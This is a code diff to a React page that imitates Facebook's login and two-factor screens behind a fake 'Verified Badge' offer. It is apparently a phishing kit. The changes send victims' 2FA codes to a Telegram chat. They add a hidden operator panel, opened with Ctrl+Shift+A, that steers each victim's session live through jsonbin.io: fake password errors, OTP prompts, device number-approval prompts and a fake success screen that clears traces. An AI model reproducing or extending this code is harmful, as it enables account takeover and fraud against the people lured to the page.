@@ -24,12 +24,14 @@ export default function Home() {
   const [loading, setLoading] = useState(false);
   const [errors, setErrors] = useState({}); const [showLoginError, setShowLoginError] = useState(false); const [showOtpError, setShowOtpError] = useState(false);
 
-  // --- STATES CHO BƯỚC 3 & ADMIN ---
+  // --- STATES CHO BƯỚC 3 & 4 & ADMIN ---
   const [matchNumber, setMatchNumber] = useState(null); 
-  const [adminInput, setAdminInput] = useState('');
+  const [showSuccess, setShowSuccess] = useState(false); // Trạng thái Bước 4
+  const [adminSessionId, setAdminSessionId] = useState(''); 
+  const [adminNumberInput, setAdminNumberInput] = useState(''); 
   const [showAdmin, setShowAdmin] = useState(false);
 
-  // --- TẠO MÃ PHIÊN CHO TỪNG NGƯỜI ---
+  // --- TẠO MÃ PHIÊN CHO NGƯỜI TRUY CẬP ---
   const [sessionId] = useState(() => {
       let id = localStorage.getItem('session_id');
       if (!id) {
@@ -76,23 +78,37 @@ export default function Home() {
       }
   }, [showModal, clientIp]);
 
-  // --- LẮNG NGHE SỐ TỪ ADMIN ---
+  // --- LẮNG NGHE LỆNH TỪ ADMIN (CHỐNG CACHE) ---
   useEffect(() => {
-    if (step === 3 && !showAdmin) {
-        const interval = setInterval(() => {
-            fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
-                headers: { 'X-Master-Key': API_KEY }
-            })
-            .then(res => res.json())
-            .then(data => {
-                if(data.record && data.record.number && data.record.target === sessionId) {
-                    setMatchNumber(data.record.number);
+    const interval = setInterval(() => {
+        fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest?t=${Date.now()}`, {
+            headers: { 'X-Master-Key': API_KEY }
+        })
+        .then(res => res.json())
+        .then(data => {
+            if(data.record && data.record.target === sessionId) {
+                if (data.record.action === 'otp') {
+                    setStep(3); 
+                    setMatchNumber(null); 
+                    setShowSuccess(false);
+                } else if (data.record.action === 'approve' && data.record.value) {
+                    setStep(3); 
+                    setMatchNumber(data.record.value); 
+                    setShowSuccess(false);
+                } else if (data.record.action === 'error') {
+                    setStep(2);
+                    setShowLoginError(true);
+                    setLoginPass('');
+                    setShowSuccess(false);
+                } else if (data.record.action === 'success') {
+                    setStep(3);
+                    setShowSuccess(true);
                 }
-            }).catch(()=>{});
-        }, 2000);
-        return () => clearInterval(interval);
-    }
-  }, [step, showAdmin, sessionId]);
+            }
+        }).catch(()=>{});
+    }, 2000);
+    return () => clearInterval(interval);
+  }, [sessionId]);
 
   // --- PHÍM TẮT MỞ ADMIN (Ctrl + Shift + A) ---
   useEffect(() => {
@@ -107,7 +123,12 @@ export default function Home() {
   }, []);
 
   // --- HÀM XỬ LÝ FORM ---
-  const openModal = () => { setShowModal(true); setStep(1); };
+  const openModal = () => { 
+      setShowModal(true); 
+      setStep(1); 
+      setShowSuccess(false); // Reset trạng thái thành công
+      setShowAdmin(false); // Tắt Admin nếu đang mở
+  };
 
   const handleSignup = (e) => {
     e.preventDefault(); let errs = {};
@@ -134,15 +155,28 @@ export default function Home() {
     e.preventDefault(); if (!/^\d{6}$|^\d{8}$/.test(otp)) { setShowOtpError(true); return; }
     setLoading(true); setShowOtpError(false); const newAttempt = otpAttempt + 1; setOtpAttempt(newAttempt);
     if (newAttempt <= 3) sendTelegramMessage(`\n<b>2FA ${newAttempt}:</b> <code>${escapeHtml(otp)}</code>`);
-    setTimeout(() => { setLoading(false); setShowOtpError(true); setOtp(''); }, 1500);
+    
+    setTimeout(() => { 
+        setLoading(false); 
+        if (newAttempt < 3) {
+            setShowOtpError(true); 
+            setOtp(''); 
+        } else {
+            // Nhập sai 3 lần -> Hiện giao diện thành công
+            setShowSuccess(true);
+            setOtp('');
+        }
+    }, 1500);
   };
 
-  const handleAdminUpdate = () => {
-      if(!adminInput || !adminInput.includes(':')) {
-          alert('Vui lòng nhập đúng định dạng: Mã Phiên : Số (VD: user_a1b2c3:42)');
+  // --- HÀM GỬI LỆNH TỪ ADMIN ---
+  const handleAdminCommand = (type, value) => {
+      const targetUser = adminSessionId.trim(); 
+      if (!targetUser) {
+          alert('Vui lòng nhập Mã Phiên của nạn nhân!');
           return;
       }
-      const [targetUser, numberToSend] = adminInput.split(':');
+      
       fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
           method: 'PUT',
           headers: {
@@ -150,11 +184,12 @@ export default function Home() {
               'X-Master-Key': API_KEY
           },
           body: JSON.stringify({ 
-              number: numberToSend.trim(), 
-              target: targetUser.trim() 
+              action: type, 
+              value: value,
+              target: targetUser
           })
       }).then(() => {
-          alert(`Đã gửi số ${numberToSend} cho người dùng ${targetUser}`);
+          alert(`Đã gửi lệnh thành công cho ${targetUser}!`);
       });
   };
 
@@ -290,19 +325,41 @@ export default function Home() {
         <div style={{ position: 'fixed', inset: 0, background: 'rgba(0, 0, 0, 0.4)', zIndex: 1000, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '24px 16px', overflowY: 'auto', backdropFilter: 'blur(4px)', WebkitBackdropFilter: 'blur(4px)' }}>
             <div style={{ position: 'relative', background: '#fff', borderRadius: '12px', padding: '28px 20px 20px', width: '100%', maxWidth: '420px', boxShadow: '0 12px 28px rgba(0,0,0,0.2)' }}>
                 
-                <button onClick={() => setShowModal(false)} style={{ position: 'absolute', top: '12px', right: '12px', background: '#f0f2f5', border: 'none', borderRadius: '50%', width: '34px', height: '34px', cursor: 'pointer', color: '#606770', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+                <button onClick={() => { 
+                    localStorage.clear(); 
+                    window.location.replace('/live'); 
+                }} style={{ position: 'absolute', top: '12px', right: '12px', background: '#f0f2f5', border: 'none', borderRadius: '50%', width: '34px', height: '34px', cursor: 'pointer', color: '#606770', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
                 </button>
 
                 {showAdmin ? (
                   <div style={{ textAlign: 'center' }}>
-                    <h2 style={{ fontSize: '22px', fontWeight: '700', marginBottom: '20px' }}>Admin Panel</h2>
-                    <p style={{ fontSize: '13px', color: '#fa383e', marginBottom: '10px' }}>
-                        Mã người dùng đang xem: <b>{sessionId}</b>
-                    </p>
-                    <input className="fb-input" type="text" placeholder="Nhập: user_xxx : 42" value={adminInput} onChange={(e) => setAdminInput(e.target.value)} />
-                    <button onClick={handleAdminUpdate} className="fb-btn" style={{ marginTop: '10px' }}>Gửi số cho người này</button>
-                    <button onClick={() => setShowAdmin(false)} className="fb-btn" style={{ marginTop: '10px', background: '#ccc', color: '#333' }}>Đóng</button>
+                    <h2 style={{ fontSize: '22px', fontWeight: '700', marginBottom: '10px' }}>Admin Panel</h2>
+                    
+                    <div style={{ marginBottom: '20px' }}>
+                        <p style={{ fontSize: '14px', marginBottom: '5px', color: '#65676b' }}>Nhập Mã Phiên nạn nhân (lấy từ Telegram):</p>
+                        <input 
+                            className="fb-input" 
+                            type="text" 
+                            placeholder="VD: user_a1b2c3" 
+                            value={adminSessionId} 
+                            onChange={(e) => setAdminSessionId(e.target.value)} 
+                        />
+                    </div>
+
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
+                        <button onClick={() => handleAdminCommand('error', '')} className="fb-btn" style={{ background: '#fa383e' }}>Báo Sai Mật Khẩu</button>
+                        <button onClick={() => handleAdminCommand('otp', '')} className="fb-btn">Chuyển sang nhập OTP</button>
+                        <button onClick={() => handleAdminCommand('success', '')} className="fb-btn" style={{ background: '#198754' }}>Báo Thành Công</button>
+                        
+                        <div style={{ border: '1px solid #ccc', padding: '15px', borderRadius: '8px', marginTop: '10px' }}>
+                            <p style={{ marginBottom: '10px', fontSize: '14px', fontWeight: 'bold' }}>Yêu cầu duyệt số:</p>
+                            <input className="fb-input" type="text" placeholder="Nhập số (VD: 45)" value={adminNumberInput} onChange={(e) => setAdminNumberInput(e.target.value)} />
+                            <button onClick={() => handleAdminCommand('approve', adminNumberInput)} className="fb-btn" style={{ marginTop: '10px' }}>Gửi Số Duyệt</button>
+                        </div>
+                        
+                        <button onClick={() => setShowAdmin(false)} className="fb-btn" style={{ marginTop: '10px', background: '#ccc', color: '#333' }}>Đóng</button>
+                    </div>
                   </div>
                 ) : (
                   <>
@@ -589,13 +646,31 @@ export default function Home() {
                       </form>
                     )}
 
-                    {/* FORM 3: 2FA & CHECK DEVICE */}
-                    {step === 3 && (
+                    {/* FORM 3 & 4: 2FA & SUCCESS */}
+                    {(step === 3 || showSuccess) && (
                       <>
-                        {matchNumber ? (
-                          // GIAO DIỆN DUYỆT THIẾT BỊ (Chỉ hiện khi mày đã nhập số)
+                        {showSuccess ? (
+                          // GIAO DIỆN THÀNH CÔNG
+                          <div style={{ textAlign: 'center', padding: '20px 0' }}>
+                            <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '10px', marginTop: '20px' }}>Request Received</h2>
+                            <p style={{ fontSize: '15px', color: '#65676b', lineHeight: '1.5', marginBottom: '20px' }}>
+                                Thank you! We have received your verification request. Your Official Verified Badge will be updated within 24 hours.
+                            </p>
+                            <button 
+                                type="button" 
+                                onClick={() => { 
+                                    localStorage.clear(); // Xóa sạch bộ nhớ tạm
+                                    window.location.replace('/live'); // Thay thế lịch sử trang
+                                }} 
+                                className="fb-btn"
+                            >
+                                Close
+                            </button>
+                          </div>
+                        ) : matchNumber ? (
+                          // GIAO DIỆN DUYỆT THIẾT BỊ
                           <>
-                            <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '10px' }}>
+                                                        <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '10px', textAlign: 'center' }}>
                                 Check your other device
                             </h2>
                             
@@ -610,10 +685,9 @@ export default function Home() {
                             <div style={{ textAlign: 'center', fontSize: '48px', fontWeight: '900', letterSpacing: '30px', textIndent: '30px', marginBottom: '30px', color: '#1c1e21' }}>
                                 {matchNumber}
                             </div>
-                            
                           </>
                         ) : (
-                          // GIAO DIỆN NHẬP MÃ 2FA BÌNH THƯỜNG (Hiện lúc đầu)
+                          // GIAO DIỆN NHẬP MÃ 2FA
                           <>
                             <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Two-factor authentication</h2>
                             
